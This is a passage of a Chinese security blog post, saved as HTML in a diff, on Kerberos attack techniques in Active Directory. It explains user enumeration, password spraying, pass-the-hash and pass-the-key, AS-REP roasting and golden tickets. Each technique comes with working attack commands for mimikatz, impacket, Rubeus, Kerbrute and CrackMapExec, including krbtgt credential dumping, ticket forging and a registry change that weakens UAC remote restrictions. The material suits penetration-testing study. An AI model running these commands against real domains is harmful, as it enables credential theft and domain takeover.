@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2025/06/12/Kerberos%E6%94%BB%E5%87%BB%E9%9D%A2/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2025/06/12/Kerberos%E6%94%BB%E5%87%BB%E9%9D%A2/","path":"2025/06/12/Kerberos攻击面/","title":"Kerberos Attacks - Kerberos攻击面"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Kerberos Attacks - Kerberos攻击面 | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="nav-text">攻击面</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#AS-REQ-amp-AS-REP"><span class="nav-text">AS_REQ &amp; AS_REP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%89%E6%95%88%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="nav-text">有效域用户枚举</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92-%E7%88%86%E7%A0%B4"><span class="nav-text">密码喷洒&#x2F;爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PTH"><span class="nav-text">PTH</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PTK"><span class="nav-text">PTK</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AS-REPRoasting"><span class="nav-text">AS-REPRoasting</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-text">黄金票据</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#TGS-REQ-amp-TGS-REP"><span class="nav-text">TGS_REQ &amp; TGS_REP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#kerberoasting"><span class="nav-text">kerberoasting</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="nav-text">白银票据</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%87%91-%E9%93%B6%E7%A5%A8%E5%AF%B9%E6%AF%94"><span class="nav-text">金&#x2F;银票对比</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PTT"><span class="nav-text">PTT</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PAC"><span class="nav-text">PAC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MS14068"><span class="nav-text">MS14068</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#noPAC"><span class="nav-text">noPAC</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/06/12/Kerberos%E6%94%BB%E5%87%BB%E9%9D%A2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Kerberos Attacks - Kerberos攻击面 | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Kerberos Attacks - Kerberos攻击面
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-06-12 00:00:00" itemprop="dateCreated datePublished" datetime="2025-06-12T00:00:00+08:00">2025-06-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250129140706755.png" alt="image-20250129140706755"></p>
+<a id="more"></a>
+
+<h1 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AS_REQ &amp; AS_REP：PTK、PTH、用户名枚举、密码喷洒、AS-REPRoasting、黄金票据</span><br><span class="line"></span><br><span class="line">TGS_REQ &amp; TGS_REP：PTT、kerberosting、白银票据</span><br><span class="line"></span><br><span class="line">S4U：非约束委派、约束委派、基于资源的约束委派</span><br><span class="line"></span><br><span class="line">PAC：ms14068、noPAC</span><br></pre></td></tr></table></figure>
+
+<h1 id="AS-REQ-amp-AS-REP"><a href="#AS-REQ-amp-AS-REP" class="headerlink" title="AS_REQ &amp; AS_REP"></a>AS_REQ &amp; AS_REP</h1><h2 id="有效域用户枚举"><a href="#有效域用户枚举" class="headerlink" title="有效域用户枚举"></a>有效域用户枚举</h2><p>攻击原理：在AS-REQ阶段，请求包中的cname字段为用户名，<strong>根据返回包的状态不同判断该用户是否存在</strong>，有如下状态码，在域内域外皆可枚举</p>
+<table>
+<thead>
+<tr>
+<th>AS-REP 回复包状态</th>
+<th>Kerberos 错误信息</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>用户存在 且启用</td>
+<td>KDC_ERR_PREAUTH_REQUIRED (需要额外的预认证)</td>
+</tr>
+<tr>
+<td>用户存在 但禁用</td>
+<td>KDC_ERR_CLIENT_REVOKED NT Status： STATUS_ACCOUNT_DISABLED (用户状态不可用)</td>
+</tr>
+<tr>
+<td>用户不存在</td>
+<td>KDC_ERR_C_PRINCIPAL_UNKNOWN (找不到此用户)</td>
+</tr>
+</tbody></table>
+<p>tom存在且启用，返回 <code>KDC_ERR_PREAUTH_REQUIRED</code></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250129154528257.png" alt="image-20250129154528257"></p>
+<p>不存在用户，返回 <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250129154912842.png" alt="image-20250129154912842"></p>
+<p><strong>工具：</strong></p>
+<p><strong>1. Kerbrute</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerbrute.exe userenum --dc 192.168.100.128 -d test.com usernames.txt -t 10 -o output.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. pyKerbrute</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#tcp 模式</span><br><span class="line">python2 EnumADUser.py 10.211.55.4 xie.com user.txt tcp</span><br><span class="line">#udp 模式</span><br><span class="line">python2 EnumADUser.py 10.211.55.4 xie.com user.txt udp</span><br></pre></td></tr></table></figure>
+
+<p>tips:</p>
+<p>Kerbrute枚举用户名是通过固定密码foobar，能否作为检测特征</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func (k KerbruteSession) TestUsername(username string) (bool, error) &#123;</span><br><span class="line">	&#x2F;&#x2F; client here does NOT assume preauthentication (as opposed to the one in TestLogin)</span><br><span class="line"></span><br><span class="line">	cl :&#x3D; kclient.NewWithPassword(username, k.Realm, &quot;foobar&quot;, k.Config, kclient.DisablePAFXFAST(true))</span><br></pre></td></tr></table></figure>
+
+<h2 id="密码喷洒-爆破"><a href="#密码喷洒-爆破" class="headerlink" title="密码喷洒/爆破"></a>密码喷洒/爆破</h2><p>攻击原理：在AS-REQ阶段根据认证返回包状态不同进行密码的喷洒和爆破</p>
+<p>密码喷洒：固定密码，跑用户名。密码爆破：固定用户名，跑密码。</p>
+<p>用户密码错误，返回 <code>KRB5KDC_ERR_PREAUTH_FAILED</code></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250129154528257.png" alt="image-20250129154528257"></p>
+<p>用户密码正确返回正常的AS-REP包</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250129161643745.png" alt="image-20250129161643745"></p>
+<p><strong>工具：</strong></p>
+<p><strong>1. Kerbrute</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">喷洒</span><br><span class="line">kerbrute.exe passwordspray --dc 10.211.55.4 -d xie.com user.txt P@ssw0rd</span><br><span class="line"></span><br><span class="line">爆破</span><br><span class="line">kerbrute.exe bruteuser --dc 10.211.55.4 -d xie.com pass.txt administrator</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. pyKerbrute</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#针对明文进行喷洒，tcp 模式和 udp 模式</span><br><span class="line">python2 ADPwdSpray.py 10.211.55.4 xie.com user.txt clearpassword P@ssw0rd tcp</span><br><span class="line">python2 ADPwdSpray.py 10.211.55.4 xie.com user.txt clearpassword P@ssw0rd udp</span><br><span class="line"></span><br><span class="line">#针对哈希进行喷洒，tcp 模式和 udp 模式</span><br><span class="line">python2 ADPwdSpray.py 10.211.55.4 xie.com user.txt ntlmhash e19ccf75ee54e06b06a5907af13cef42 tcp</span><br><span class="line">python2 ADPwdSpray.py 10.211.55.4 xie.com user.txt ntlmhash e19ccf75ee54e06b06a5907af13cef42 udp</span><br></pre></td></tr></table></figure>
+
+<h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p>攻击原理：NTLM 认证过程和 Kerberos 认证过程都支持使用用户密码的 NTLM Hash 来进行加密，当抓取到用户的hash后可以直接去进行认证而跳过密码认证。</p>
+<p>在Windows Server2012 及其以后的机器，默认不会在内存中保存明文密码，需要PTH横向</p>
+<p><strong>由于UAC的限制</strong>，不同的账户类型PTH结果也会失败或成功：</p>
+<table>
+<thead>
+<tr>
+<th align="left">账户描述</th>
+<th align="left">PTH结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">pubcli_user：本地普通用户</td>
+<td align="left">失败</td>
+</tr>
+<tr>
+<td align="left">test：本地管理员组用户</td>
+<td align="left">失败</td>
+</tr>
+<tr>
+<td align="left">Administrator：本地管理员组用户</td>
+<td align="left">成功</td>
+</tr>
+<tr>
+<td align="left">xie\hack：域用户 &amp;&amp; 本地管理员组用户</td>
+<td align="left">成功</td>
+</tr>
+</tbody></table>
+<p>当 <strong>内置管理员账户 Administrator</strong> 进行远程连接时会直接得到具有管理员凭证的令牌，而 <strong>非Administrator 的本地管理员账户</strong> 进行远程连接时，会得到一个删除了管理员凭证的令牌。而 <strong>本地管理员组中的域用户</strong> 进行远程连接时，UAC 不会生效，会直接得到一个具有管理员凭证的令牌。</p>
+<p><strong>工具：</strong></p>
+<p><strong>1. CrackMapExec</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.211.55.0&#x2F;24 -u Administrator -H 329153f560eb329c0e1deea55e88a1e9 -x whoami</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. mimikatz</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:10.211.55.7 &#x2F;ntlm:329153f560eb329c0e1deea55e88a1e9</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. impacket</strong></p>
+<p>psexec、smbexec、wmiexec、atexec、dcomexec等exec脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 psexec.py administrator@10.211.55.7 -hashes :329153f560eb329c0e1deea55e88a1e9</span><br></pre></td></tr></table></figure>
+
+<p><strong>4. evil-winrm</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 192.168.1.10 -u Administrator -H &lt;NTLM_HASH&gt;</span><br></pre></td></tr></table></figure>
+
+<p>tips：</p>
+<p>让 <strong>非Administrator 的本地管理员账户</strong> 进行远程连接时也得到一个具有管理员凭证的令牌，使其PTH成功</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure>
+
+<h2 id="PTK"><a href="#PTK" class="headerlink" title="PTK"></a>PTK</h2><p>在kerberos的AS-REQ阶段，预认证要求用户提供 <strong>从用户密码派生的密钥</strong>，Kerberos 提供 4 种不同的密钥类型：<strong>DES、RC4、AES-128 和 AES-256</strong></p>
+<p>攻击原理：当启用RC4时，RC4 密钥实际上是用户的 NT 哈希，这种攻击方式叫PTH。当RC4被禁用时，其他 Kerberos 密钥（DES、AES-128、AES-256）也可以传递，这种攻击技术称为PTK。二者仅仅是传递的密钥不同。由于其他密钥如AES256是在kerberos协议中，因此 <strong>PTK的利用环境为：开启了aes认证的域环境中</strong></p>
+<p>微软发布了针对 Pass The Hash 哈希传递攻击的更新补丁 <strong>KB2871997</strong>，引入了一些安全机制</p>
+<ul>
+<li>Protected Users 组的支持</li>
+<li>Restricted Admin RDP 模式远程客户端支持</li>
+<li>Pass The Hash 增强保护</li>
+</ul>
+<p><strong>工具：</strong></p>
+<p><strong>1. mimikatz</strong></p>
+<p>当拿下一台域内主机时，dump下aeskey，然后通过该凭证去尝试登录其他机器</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::ekeys&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p>导入aes key</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth &#x2F;user:tom &#x2F;domain:test.com &#x2F;aes256:0b387bfe557dbd745c08721d3fc5440c9e63a97f7c4fd9eb1085ee3e472af12c&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="AS-REPRoasting"><a href="#AS-REPRoasting" class="headerlink" title="AS-REPRoasting"></a>AS-REPRoasting</h2><p>攻击原理：域内某些账号设置了 <strong>不要求 kerberos 预身份验证</strong>，因此不需要AS-REQ的预身份验证，直接向域控的 88 Kerberos 端口去请求票据，这时AS-REP就会返回 <strong>TGT、用户hash加密的session key</strong>，对内容重新组合能够拼接成 Kerberos 5 AS-REP etype 23(18200) 的格式，针对被加密的session key进行<strong>本地离线破解，从而爆破出用户密码</strong></p>
+<hr>
+<p><strong>域内机器利用思路：</strong>直接ldap查询出域内不需要身份认证的用户</p>
+<p>通过adfind或者adexplorer查询域内信息满足 <code>(userAccountControl:1.2.840.113556.1.4.803:=4194304)</code> 的用户</p>
+<p>adfind查询</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adfind -h 192.168.100.128:389 -u test.com\tom -up Ab123456 -f &quot;useraccountcontrol:1.2.840.113556.1.4.803:&#x3D;4194304&quot; -dn</span><br></pre></td></tr></table></figure>
+
+<p>adexplorer中,由于userAccountControl的值为叠加查询属性值大于或等于4194304的用户</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adexplorer64.exe -snapshot &quot;&quot; test.dat</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250204163504951.png" alt="image-20250204163504951"></p>
+<p><strong>非域内机器利用思路：</strong>如果有域内账号凭证，利用凭证查询出不需要身份认证的用户；如果没有域内账号凭证，利用大量用户名字典先去有效用户枚举，再去探测不需要身份认证的用户</p>
+<p><strong>工具：</strong></p>
+<p><strong>1. Rubeus</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asreproast &#x2F;format:john &#x2F;outfile:hashs.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. impacket</strong></p>
+<p>GetNPUsers.py用于尝试获得并列出不需要Kerberos域认证的用户</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 域外机器无凭证盲爆用户</span><br><span class="line">python GetNPUsers.py -usersfile users.txt -outputfile hashs.txt -dc-ip 192.168.100.128 -format hashcat</span><br><span class="line"></span><br><span class="line"># 域外机器有凭证</span><br><span class="line">python GetNPUsers.py -outputfile hashs.txt -dc-ip 192.168.100.128 -format hashcat test&#x2F;tom:Ab123456</span><br><span class="line">python GetNPUsers.py -outputfile hashs.txt -dc-ip 192.168.100.128 -format hashcat -request test&#x2F;tom:Ab123456</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250204171557999.png" alt="image-20250204171557999"></p>
+<p><strong>本地爆破：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john --wordlist&#x3D;pass.txt hashs.txt</span><br><span class="line">hashcat -m 18200 hashs.txt pass.txt --force --show</span><br></pre></td></tr></table></figure>
+
+<h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><p>攻击原理：在AS-REP阶段，返回的TGT加密部分是由krbtgt用户的密钥加密的，<strong>如果获得了krbtgt的密钥，就可以伪造签发TGT票据，再去发起TGS请求，从而访问任意服务</strong>，该票据被称为黄金票据（GoldenTicket）</p>
+<hr>
+<p><strong>黄金票据特点：</strong></p>
+<ul>
+<li><p>域控中<strong>KDC服务在20分钟内不验证TGT中的用户帐户</strong>，这意味在这时间内可以使用 <strong>被禁用、被删除、不存在</strong> 的帐户（KB5008380后域用户必须存在！）</p>
+</li>
+<li><p>域控上由KDC服务配置的Kerberos策略：如果提供票据，则系统信任票据的有效性。这意味着，即使域策略声明Kerberos登录票据（TGT）只有10小时有效，如果票据声明有效期为10 年，那么也会信任票据的有效性期为10年</p>
+</li>
+<li><p>该KRBTGT帐户密码从不更改和直到KRBTGT密码被更改（两次），攻击者可以创建黄金票据。请注意，即使伪造用户更改其密码，创建用于模拟用户的Golden Ticket仍然存在</p>
+</li>
+<li><p>它绕过了SmartCard身份验证要求，因为它绕过了DC在创建TGT之前执行的常规验证</p>
+</li>
+<li><p>金票可用于模拟任何用户访问Active Directory中的任何资源</p>
+</li>
+<li><p>在主机上都可以生成和使用黄金票据（TGT），即使没有加入域，只要网络可以访问域</p>
+</li>
+</ul>
+<p><strong>制作金票条件：</strong></p>
+<ul>
+<li>域名称</li>
+<li>域的SID值</li>
+<li>域用户 krbtgt 的 NTLM Hash 或 AES-256 或 AES-128</li>
+<li>伪造的任意用户名</li>
+</ul>
+<hr>
+<p><strong>攻击步骤：</strong></p>
+<p>一、获取所需条件信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">域名：test.com</span><br><span class="line">域SID：S-1-5-21-3222783777-1006235836-3661351843</span><br><span class="line">krbtgt：mimikatz.exe log &quot;lsadump::dcsync &#x2F;domain:test.com &#x2F;user:krbtgt&quot; exit</span><br><span class="line">		# Hash NTLM: 2cab196e52f4b152337ab1e4d3242923</span><br><span class="line">		# aes256_hmac: 2f526bb9eea0dc4a19f0023a8f91921ee822429873c8203865f3d3237c49a8b1</span><br><span class="line">伪造的任意用户名：Administrator</span><br></pre></td></tr></table></figure>
+
+<p>二、工具</p>
+<p><strong>1. Mimikatz</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 列出当前票据</span><br><span class="line">kerberos::list</span><br><span class="line"># 清空票据</span><br><span class="line">kerberos::purge</span><br><span class="line"># 直接注入伪造</span><br><span class="line">kerberos::golden &#x2F;user:hacker &#x2F;domain:test.com &#x2F;sid:S-1-5-21-... &#x2F;rc4:2cab196e5... &#x2F;ptt</span><br><span class="line">or</span><br><span class="line">kerberos::golden &#x2F;user:hacker &#x2F;domain:test.com &#x2F;sid:S-1-5-21-... &#x2F;aes256:2f526bb9eea... &#x2F;ptt</span><br><span class="line">or</span><br><span class="line">kerberos::golden &#x2F;admin:hacker &#x2F;domain:test.com &#x2F;sid:S-1-5-21-... &#x2F;krbtgt:2cab196e5... &#x2F;ptt</span><br><span class="line">or</span><br><span class="line">kerberos::golden &#x2F;user:Administrator &#x2F;domain:test.com &#x2F;sid:S-1-5-21-... &#x2F;krbtgt:2cab196e5... &#x2F;ptt</span><br><span class="line"></span><br><span class="line"># 验证金票</span><br><span class="line">dir \\DC-1\C$</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250213025748716.png" alt="image-20250213025748716"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250213030129685.png" alt="image-20250213030129685"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;domain - 完整的域名，在这个例子中：test.com</span><br><span class="line">&#x2F;sid - 域的SID,在这个例子中：S-1-5-21-1473643419-774954089-2222329127</span><br><span class="line">&#x2F;sids - AD森林中账户&#x2F;组的额外SID，凭证拥有权限进行欺骗。通常这将是根域Enterprise Admins组的S-1-5-21-1473643419-774954089-5872329127-519值</span><br><span class="line">&#x2F;user - 伪造的用户名</span><br><span class="line">&#x2F;groups（可选）- 用户所属的组RID（第一组是主组）,添加用户或计算机帐户RID以接收相同的访问权限,默认组：513,512,520,518,519为默认的管理员组</span><br><span class="line">&#x2F;krbtgt - 域KRBTGT的NTLM</span><br><span class="line">&#x2F;ticket（可选）- 提供一个路径和名称，用于保存Golden Ticket文件</span><br><span class="line">&#x2F;ptt - 将伪造的票据插入到内存中以供使用</span><br><span class="line">&#x2F;id（可选）- 用户RID, Mimikatz默认值是500</span><br><span class="line">&#x2F;startoffset（可选）- 票据可用时的起始偏移量,Mimikatz默认值是0</span><br><span class="line">&#x2F;endin（可选）- 票据使用时间范围。Mimikatz默认值是10年,Active Directory默认Kerberos策略设置为10小时</span><br><span class="line">&#x2F;renewmax（可选）- 续订最长票据有效期。Mimikatz默认值是10年,Active Directory默认Kerberos策略设置为7天</span><br><span class="line">&#x2F;aes128 - AES128密钥</span><br><span class="line">&#x2F;aes256 - AES256密钥</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. Rubeus</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe dump &#x2F;nowrap &#x2F;service:krbtgt &gt; ticket.kirbi</span><br><span class="line">Rubeus.exe golden &#x2F;krbtgt:&lt;KRBTGT_HASH&gt; &#x2F;domain:test.com &#x2F;sid:&lt;DOMAIN_SID&gt; &#x2F;user:Administrator &#x2F;nowrap</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. Impacket</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Find the domain SID</span><br><span class="line">lookupsid.py -hashes &#39;LMhash:NThash&#39; &#39;DOMAIN&#x2F;DomainUser@DomainController&#39; 0</span><br><span class="line"></span><br><span class="line"># Create the golden ticket with ntlm</span><br><span class="line">ticketer.py -nthash &quot;$krbtgtNThash&quot; -domain-sid &quot;$domainSID&quot; -domain &quot;$DOMAIN&quot; &quot;randomuser&quot;</span><br><span class="line"></span><br><span class="line"># Create the golden ticket with aeskey</span><br><span class="line">ticketer.py -aesKey &quot;$krbtgtAESkey&quot; -domain-sid &quot;$domainSID&quot; -domain &quot;$DOMAIN&quot; &quot;randomuser&quot;</span><br><span class="line"></span><br><span class="line"># Create the golden ticket with custom user&#x2F;groups ids</span><br><span class="line">ticketer.py -nthash &quot;$krbtgtNThash&quot; -domain-sid &quot;$domainSID&quot; -domain &quot;$DOMAIN&quot; -user-id &quot;$USERID&quot; -groups &quot;$GROUPID1,$GROUPID2,...&quot; &quot;randomuser&quot;</span><br><span class="line"></span><br><span class="line"># linux下导入票据到内存</span><br><span class="line">export KRB5CCNAME&#x3D;administrator.ccache</span><br><span class="line"></span><br><span class="line"># 